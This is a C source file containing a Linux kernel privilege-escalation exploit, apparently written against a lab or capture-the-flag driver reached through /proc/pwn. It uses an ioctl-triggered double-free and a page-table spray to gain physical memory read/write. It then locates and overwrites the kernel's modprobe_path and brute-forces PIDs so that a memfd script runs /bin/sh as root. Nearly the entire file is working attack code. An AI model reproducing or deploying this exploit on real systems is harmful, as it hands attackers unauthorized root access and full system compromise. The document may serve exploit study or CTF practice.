#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<sys/ioctl.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
#include<sys/mman.h>
#include<linux/memfd.h>
#include <sched.h>  // 包含 cpu_set_t 定义的头文件
#include <linux/memfd.h>
#include <unistd.h>
#include<signal.h>
#define CONFIG_PHYS_MEM (0x800000000 + 0x100000000)  // default: 32GiB system ram + 4GiB PCIe mmio and stuff
#define CONFIG_PHYSICAL_ALIGN ((unsigned long long)0x200000)  // default
							      //
static void pin_cpu(int cpu_id) {
	cpu_set_t mask;

	CPU_ZERO(&mask); // clear the CPU set
	CPU_SET(cpu_id, &mask); // set the bit that represents CPU x

	if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
		perror("sched_setaffinity");
		exit(1);
	}
}

int read_file(const char *filename, void *buf, size_t buflen)
{
	int fd;
	int retv;

	fd = open(filename, O_RDONLY);
	if (fd < 0)
	{
		perror("open$read_file");
		exit(EXIT_FAILURE);
	}

	retv = read(fd, buf, buflen);
	if (retv < 0)
	{
		perror("read$read_file");
		exit(EXIT_FAILURE);
	}

	close(fd);

	return retv;
}
static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);

	close(fd);
}
#define KMOD_PATH_LEN 256  // default
#define CONFIG_PTE_SPRAY_AMOUNT 16000  // default: high-ball for debian systems

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#if CONFIG_VERBOSE_
#define PRINTF_VERBOSE(...) printf(__VA_ARGS__)
#else
#define PRINTF_VERBOSE(...)
#endif

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
		_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;

	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);

	if (size == buflen)
		printf("[*] ==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====\n");

	// remove \x0a
	buf[size-1] = '\x00';

	return size;
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);

	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	// search 0x200000 bytes (a full PTE at a time) for the modprobe_path signature
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	// check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe
	strcpy(pmd_modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0)
	{
		printf("[-] ^false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}
void pwn(int shell_stdin_fd, int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf("[+] running normal privesc\n");

	PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;

	// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);


	// cause socket/networking-related objects to be allocated
	int fd=open("/proc/pwn",2);
	ioctl(fd,0,0);

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

	PRINTF_VERBOSE("[*] double-freeing skb...\n");

	// cause double-free on skb from earlier
	ioctl(fd,0,0);
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;

	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf("[+] confirmed double alloc PMD/PTE\n");
			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);

		return;
	}

	// set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++)
		{
			unsigned long long phys_kernel_base;

			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
			// - it's different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep '00200000:'

			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			PRINTF_VERBOSE("[*] phys kernel addr: %016llx, val: %016llx\n", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));

			/*由于分配内存过小，跳过这步
			 * if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
			 continue;

			 printf("[+] found possible physical kernel base: %016llx\n", phys_kernel_base);
			 */
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++)
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);

#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf("[+] verified modprobe_path/usermodehelper_path: %016llx ('%s')...\n", phys_modprobe_addr, (char*)pmd_modprobe_addr);

				PRINTF_VERBOSE("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);

				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						PRINTF_VERBOSE("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
						PRINTF_VERBOSE("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						PRINTF_VERBOSE("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
					}

					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);

					return;
				}

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

				return;
			}

			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n");
	return;

}
void signal_handler_sleep(int sig)
{
	printf("[*] handling ctrl-c by sleeping background thread\n");
	printf("!! >> if you did this while in the root shell, the terminal will be messed up << !!\n");
	sleep(9999);
}

int main(){
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	// detaches program and makes it sleep in background when succeeding or failing
	// - prevents kernel system instability when trying to free resources
	if (fork() == 0)
	{
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		// open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

		pwn(shell_stdin_fd, shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		// prevent crashes due to invalid pagetables
		sleep(9999);
	}

	// prevent premature exits
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
}

